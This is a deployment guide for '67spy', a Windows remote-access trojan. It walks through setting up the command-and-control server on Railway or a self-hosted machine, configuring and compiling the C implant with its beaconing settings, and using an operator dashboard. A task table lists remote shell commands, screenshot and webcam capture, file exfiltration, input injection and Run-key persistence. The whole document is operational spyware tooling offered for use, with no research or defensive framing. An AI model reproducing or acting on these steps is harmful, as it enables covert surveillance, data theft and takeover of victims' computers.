# 67Spy — Deployment Guide

---

## 1. Generate Keys

Run once. Keep these secret — they are the root of all security.

```bash
# AES-256 key (64 hex chars)
python3 -c "import secrets; print(secrets.token_hex(32))"

# HMAC key (64 hex chars)
python3 -c "import secrets; print(secrets.token_hex(32))"

# API operator token (any strong random string)
python3 -c "import secrets; print(secrets.token_urlsafe(32))"

# Flask secret key
python3 -c "import secrets; print(secrets.token_hex(32))"
```

---

## 2. Deploy Server (Railway)

### a. Push to GitHub
```bash
cd server/
git init
git add .
git commit -m "67spy server"
gh repo create 67spy-server --private --source=. --push
```

### b. Create Railway project
1. Go to https://railway.app → New Project → Deploy from GitHub
2. Select your `67spy-server` repo
3. Add environment variables (Settings → Variables):

| Variable          | Value                              |
|-------------------|------------------------------------|
| `AES_KEY`         | *(64-char hex from step 1)*        |
| `HMAC_KEY`        | *(64-char hex from step 1)*        |
| `API_TOKEN`       | *(token from step 1)*              |
| `SECRET_KEY`      | *(hex from step 1)*                |
| `DASH_USER`       | your operator username             |
| `DASH_PASS`       | your operator password             |
| `STALE_TIMEOUT`   | `600` *(optional, default 600s)*   |

4. Deploy. Railway auto-detects Python via Nixpacks.
5. Note your public domain: `https://yourapp.railway.app`

---

## 3. Configure & Build Implant

Edit the config block at the top of `implant/implant.c`:

```c
#define HOST        "yourapp.railway.app"   // ← your Railway domain
#define PORT        443                     // 443 for Railway HTTPS
#define USE_TLS     1                       // keep 1 for Railway

static const uint8_t MASTER_AES_HEX[]  = "YOUR_64_HEX_AES_KEY_HERE";
static const uint8_t MASTER_HMAC_HEX[] = "YOUR_64_HEX_HMAC_KEY_HERE";

// Tune if desired:
#define BEACON_INTERVAL_MS   5000
#define BEACON_JITTER_MS     2000
```

Keys must match exactly what you set on Railway.

### Build (Windows, MSVC + CMake)

```bat
cd implant\
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
# output: build\Release\implant.exe
```

### Cross-compile from Linux (MinGW-w64)

```bash
sudo apt install mingw-w64 cmake
cd implant/
cmake -B build \
  -DCMAKE_BUILD_TYPE=Release \
  -DCMAKE_TOOLCHAIN_FILE=../mingw-toolchain.cmake
cmake --build build
```

MinGW toolchain file (`mingw-toolchain.cmake`):
```cmake
set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)
set(CMAKE_RC_COMPILER x86_64-w64-mingw32-windres)
set(CMAKE_FIND_ROOT_PATH /usr/x86_64-w64-mingw32)
set(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)
set(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
set(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)
```

---

## 4. Access Operator Dashboard

```
https://yourapp.railway.app/
```

Log in with `DASH_USER` / `DASH_PASS`.

Dashboard auto-refreshes every 5 seconds. Click any client row or **Manage** to open the full operator panel (Shell, Screenshot, Webcam, Remote Desktop, Files, Info tabs).

---

## 5. Environment Variable Reference

| Variable        | Default      | Description                                      |
|-----------------|--------------|--------------------------------------------------|
| `PORT`          | `8080`       | Listen port (Railway sets this automatically)    |
| `AES_KEY`       | —            | **Required.** 64-char hex, AES-256 master key    |
| `HMAC_KEY`      | —            | **Required.** 64-char hex, HMAC-SHA256 master key|
| `API_TOKEN`     | —            | **Required.** Bearer token for operator API      |
| `DASH_USER`     | `admin`      | Dashboard login username                         |
| `DASH_PASS`     | `changeme`   | Dashboard login password — **change this**       |
| `SECRET_KEY`    | random       | Flask session signing key — set for persistence  |
| `STALE_TIMEOUT` | `600`        | Seconds before idle client is reaped             |
| `DB_PATH`       | `67spy.db`   | SQLite database file path                        |

---

## 6. Self-Hosted (non-Railway)

```bash
cd server/
pip install -r requirements.txt

export AES_KEY="..."
export HMAC_KEY="..."
export API_TOKEN="..."
export DASH_USER="operator"
export DASH_PASS="strongpassword"
export SECRET_KEY="..."
export PORT=8080

python server.py
```

Reverse-proxy with nginx + Let's Encrypt for TLS.

---

## 7. Implant Tasks Reference

Tasks queued from the operator panel (handled automatically by the UI):

| `type`       | Params                  | Description                          |
|--------------|-------------------------|--------------------------------------|
| `shell`      | `cmd=<string>`          | Run cmd.exe command, return output   |
| `screenshot` | —                       | Capture screen, upload as PNG        |
| `webcam`     | —                       | Grab webcam frame, upload as PNG     |
| `mousemove`  | `x=N y=N`               | Move mouse to absolute coords        |
| `lclick`     | `x=N y=N`               | Left click                           |
| `rclick`     | `x=N y=N`               | Right click                          |
| `dblclick`   | `x=N y=N`               | Double click                         |
| `keypress`   | `vk=N`                  | Send virtual key code                |
| `typetext`   | `text=<char>`           | Type a character                     |
| `upload`     | `path=<path> name=<n>`  | Pull file from client                |
| `sleep`      | `ms=N`                  | Adjust beacon interval               |
| `die`        | —                       | Kill implant + remove persistence (uninstalls Run key) |

> **Upload size note**: `MAX_UPLOAD = 50 MB` on the server. The implant base64-encodes ciphertext before sending (~33% overhead), so the practical maximum file size is **≈ 35 MB**. Files larger than that will hit the server's content-length limit and return HTTP 413.

---

Built by Olivia — https://discord.gg/ojailbreaks
